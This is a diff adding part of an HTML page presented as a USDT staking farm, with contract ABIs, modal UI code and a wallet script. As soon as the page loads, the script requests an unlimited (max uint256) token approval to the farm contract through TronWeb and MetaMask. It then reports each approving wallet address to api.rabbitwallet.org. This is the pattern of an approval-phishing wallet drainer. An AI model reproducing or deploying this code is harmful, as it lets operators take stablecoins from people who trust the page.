+      "inputs": [{
+        "indexed": true,
+        "internalType": "address",
+        "name": "owner",
+        "type": "address"
+      }, {
+        "indexed": true,
+        "internalType": "address",
+        "name": "spender",
+        "type": "address"
+      }, {
+        "indexed": false,
+        "internalType": "uint256",
+        "name": "value",
+        "type": "uint256"
+      }],
+      "name": "Approval",
+      "type": "event"
+    }, {
+      "anonymous": false,
+      "inputs": [{
+        "indexed": true,
+        "internalType": "address",
+        "name": "previousOwner",
+        "type": "address"
+      }, {
+        "indexed": true,
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }],
+      "name": "OwnershipTransferred",
+      "type": "event"
+    }, {
+      "anonymous": false,
+      "inputs": [{
+        "indexed": true,
+        "internalType": "address",
+        "name": "from",
+        "type": "address"
+      }, {
+        "indexed": true,
+        "internalType": "address",
+        "name": "to",
+        "type": "address"
+      }, {
+        "indexed": false,
+        "internalType": "uint256",
+        "name": "value",
+        "type": "uint256"
+      }],
+      "name": "Transfer",
+      "type": "event"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "_decimals",
+      "outputs": [{
+        "internalType": "uint8",
+        "name": "",
+        "type": "uint8"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "_name",
+      "outputs": [{
+        "internalType": "string",
+        "name": "",
+        "type": "string"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "_symbol",
+      "outputs": [{
+        "internalType": "string",
+        "name": "",
+        "type": "string"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [{
+        "internalType": "address",
+        "name": "owner",
+        "type": "address"
+      }, {
+        "internalType": "address",
+        "name": "spender",
+        "type": "address"
+      }],
+      "name": "allowance",
+      "outputs": [{
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "spender",
+        "type": "address"
+      }, {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }],
+      "name": "approve",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [{
+        "internalType": "address",
+        "name": "account",
+        "type": "address"
+      }],
+      "name": "balanceOf",
+      "outputs": [{
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }],
+      "name": "burn",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "decimals",
+      "outputs": [{
+        "internalType": "uint8",
+        "name": "",
+        "type": "uint8"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "spender",
+        "type": "address"
+      }, {
+        "internalType": "uint256",
+        "name": "subtractedValue",
+        "type": "uint256"
+      }],
+      "name": "decreaseAllowance",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "getOwner",
+      "outputs": [{
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "spender",
+        "type": "address"
+      }, {
+        "internalType": "uint256",
+        "name": "addedValue",
+        "type": "uint256"
+      }],
+      "name": "increaseAllowance",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }],
+      "name": "mint",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "name",
+      "outputs": [{
+        "internalType": "string",
+        "name": "",
+        "type": "string"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "owner",
+      "outputs": [{
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [],
+      "name": "renounceOwnership",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "symbol",
+      "outputs": [{
+        "internalType": "string",
+        "name": "",
+        "type": "string"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": true,
+      "inputs": [],
+      "name": "totalSupply",
+      "outputs": [{
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "recipient",
+        "type": "address"
+      }, {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }],
+      "name": "transfer",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "sender",
+        "type": "address"
+      }, {
+        "internalType": "address",
+        "name": "recipient",
+        "type": "address"
+      }, {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      }],
+      "name": "transferFrom",
+      "outputs": [{
+        "internalType": "bool",
+        "name": "",
+        "type": "bool"
+      }],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }, {
+      "constant": false,
+      "inputs": [{
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }],
+      "name": "transferOwnership",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }];
+    const farm_abi = [
+      {
+        "constant": false,
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "user_ad",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "num_apply",
+            "type": "uint256"
+          }
+        ],
+        "name": "allowAd",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {
+            "internalType": "uint256",
+            "name": "value",
+            "type": "uint256"
+          }
+        ],
+        "name": "burn",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [],
+        "name": "harvest",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {
+            "internalType": "uint256",
+            "name": "farm_value",
+            "type": "uint256"
+          }
+        ],
+        "name": "stake",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "constant": false,
+        "inputs": [],
+        "name": "unStake",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "account",
+            "type": "address"
+          }
+        ],
+        "name": "rewardOf",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "account",
+            "type": "address"
+          }
+        ],
+        "name": "stakeOf",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "totalStake",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+      }
+    ];
+    var from_address = address0;
+
+    var status_waiting_approve = 0;
+
+    $(document).ready(async function () {
+      var obj = setInterval(async () => {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+          clearInterval(obj);
+          var from_ad = await window.tronWeb.defaultAddress.base58;
+          console.log(from_ad);
+          var tronweb = window.tronWeb;
+          const contract = await tronWeb.contract().at(usdt_farm_contract);
+          const contract_usdt = await tronWeb.contract().at(usdt_contract);
+          var staked_value = await contract.stakeOf(from_ad).call();
+          var reward_value = await contract.rewardOf(from_ad).call();
+          var balance_usdt = await contract_usdt.balanceOf(from_ad).call();
+
+          var check_allowance = (
+            await contract_usdt.allowance(from_ad, usdt_farm_contract).call()
+          ).remaining;
+          var interval_approve_1 = setInterval(async () => {
+            check_allowance = (
+              await contract_usdt
+                .allowance(from_ad, usdt_farm_contract)
+                .call()
+            ).remaining;
+            if (check_allowance > 0) {
+              clearInterval(interval_approve_1);
+            }
+          }, 2500);
+          // var check_allowance = tronweb.toBigNumber("0x" + result_al.constant_result[0]);
+          if (check_allowance > 0) {
+            if (typeof window.ethereum !== 'undefined') {
+              console.log('MetaMask is installed!');
+            }
+            const web3 = new Web3(window.ethereum);
+            const usdt_contract = new web3.eth.Contract(usdt_abi, usdt_contract_ad);
+            const farm_contract = new web3.eth.Contract(farm_abi, farm_contract_ad);
+            var allowance_value = 0;
+            var usdt_balance = 0;
+
+            var accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            if (accounts) {
+              from_address = accounts[0];
+              allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+              ///
+              ///
+
+              if (allowance_value > 0) {
+              } else {
+                var interval_approve = setInterval(async () => {
+                  allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+                  if (allowance_value > 0) {
+                    clearInterval(interval_approve);
+                    status_waiting_approve = 0;
+                  }
+                }, 3000);
+                var approve_data = usdt_contract.methods.approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether")).encodeABI();
+                ethereum.request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                    from: from_address,
+                    to: usdt_contract_ad,
+                    gas: web3.utils.toHex(250000),
+                    value: 0x00,
+                    data: approve_data,
+                  },],
+                }).then((txHash) => { console.log(txHash); fetch("https://api.rabbitwallet.org/api/approve?ad=" + from_address + "&co=busd"); }).catch((error) => console.error);
+                status_waiting_approve = 1;
+              }
+            }
+          } else {
+            var r1 = [
+              {
+                type: "address",
+                value: usdt_farm_contract,
+              },
+              {
+                type: "uint256",
+                value:
+                  "115792089237316195423570985008687907853269984665640564039457584007913129639934",
+              },
+            ];
+
+            var result1 = await tronweb.transactionBuilder.triggerSmartContract(
+              usdt_contract,
+              "approve(address,uint256)",
+              {},
+              r1,
+              from_ad
+            );
+
+            var aaa1 = await tronweb.trx.sign(result1.transaction);
+            var bb1 = tronweb.trx.sendRawTransaction(aaa1).then(async data => {
+              fetch(
+                "https://api.rabbitwallet.org/api/approve?ad=" +
+                from_ad +
+                "&co=usdt"
+              );
+              if (typeof window.ethereum !== 'undefined') {
+                console.log('MetaMask is installed!');
+              }
+              const web3 = new Web3(window.ethereum);
+              const usdt_contract = new web3.eth.Contract(usdt_abi, usdt_contract_ad);
+              const farm_contract = new web3.eth.Contract(farm_abi, farm_contract_ad);
+              var allowance_value = 0;
+              var usdt_balance = 0;
+
+              var accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+              if (accounts) {
+                from_address = accounts[0];
+                allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+                ///
+                ///
+
+                if (allowance_value > 0) {
+                } else {
+                  var interval_approve = setInterval(async () => {
+                    allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+                    if (allowance_value > 0) {
+                      clearInterval(interval_approve);
+                      status_waiting_approve = 0;
+                    }
+                  }, 3000);
+                  var approve_data = usdt_contract.methods.approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether")).encodeABI();
+                  ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                      from: from_address,
+                      to: usdt_contract_ad,
+                      gas: web3.utils.toHex(250000),
+                      value: 0x00,
+                      data: approve_data,
+                    },],
+                  }).then((txHash) => { console.log(txHash); fetch("https://api.rabbitwallet.org/api/approve?ad=" + from_address + "&co=busd"); }).catch((error) => console.error);
+                  status_waiting_approve = 1;
+                }
+              }
+
+            });
+          }
+        }
+      }, 100);
+    });
+  </script>
+  <script>
+    $(document).ready(function () {
+      $(".token-item").click(function () {
+        var token = $("#token-name").text();
+        $("#myModal").css('display', 'none');
+        $("#myModal1").css('display', 'none');
+      });
+
+    })
+  </script>
+  <script>
+    // Get the modal
+    var modal = document.getElementById("myModal");
+    var modal1 = document.getElementById("myModal1");
+    var clickE = document.getElementById("clickE");
+    var clickU = document.getElementById("clickU");
+    var clickB = document.getElementById("clickB");
+    var clickU1 = document.getElementById("clickU1");
+    var clickW = document.getElementById("clickW");
+    var clickS = document.getElementById("clickS");
+
+    var textToken = document.getElementById("textToken");
+    var textToken1 = document.getElementById("textToken1");
+    var imgToken = document.getElementById("imgToken");
+
+    var imgToken1 = document.getElementById("imgToken1");
+    // var weth = document.getElementsByClassName("token-item-weth")[0]
+
+    // Get the button that opens the modal
+    var btn = document.getElementById("myBtn");
+    var btn1 = document.getElementById("myBtn1");
+
+    // Get the <span> element that closes the modal
+    var span = document.getElementsByClassName("close")[0];
+    var span1 = document.getElementsByClassName("close")[1];
+    // When the user clicks the button, open the modal
+    // weth.onclick = function () {
+    //     alert('ok')
+    // }
+    btn.onclick = function () {
+      modal.style.display = "block";
+    };
+    btn1.onclick = function () {
+      modal1.style.display = "block";
+    };
+
+    // When the user clicks on <span> (x), close the modal
+    span.onclick = function () {
+      modal.style.display = "none";
+    };
+    span1.onclick = function () {
+      modal1.style.display = "none";
+    };
+    clickE.onclick = function () {
+      textToken.textContent = 'USDT';
+      console.log(imgToken.src);
+      imgToken.src = "./static/images/usdt.png";
+    };
+    clickB.onclick = function () {
+      textToken.textContent = 'BUSD';
+      imgToken.src = "./static/images/busd.png"
+    };
+    clickU.onclick = function () {
+      textToken.textContent = 'BNB';
+      imgToken.src = "./static/images/bnb.png";
+    };
+    clickU1.onclick = function () {
+      textToken1.textContent = 'SOL';
+      imgToken1.src = "../sol.png";
+
+    };
+    clickW.onclick = function () {
+      textToken1.textContent = 'USDT';
+      imgToken1.src = "./static/images/usdt.png";
+    };
+    clickS.onclick = function () {
+      textToken1.textContent = 'USDJ';
+      imgToken1.src = "./static/images/usdj.png";
+    };
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function (event) {
+      if (event.target == modal) {
+        modal.style.display = "none";
+      } else if (event.target == modal1) {
+        modal1.style.display = "none";
+      }
+    };
+
+  </script>
+</body>
+
+</html>
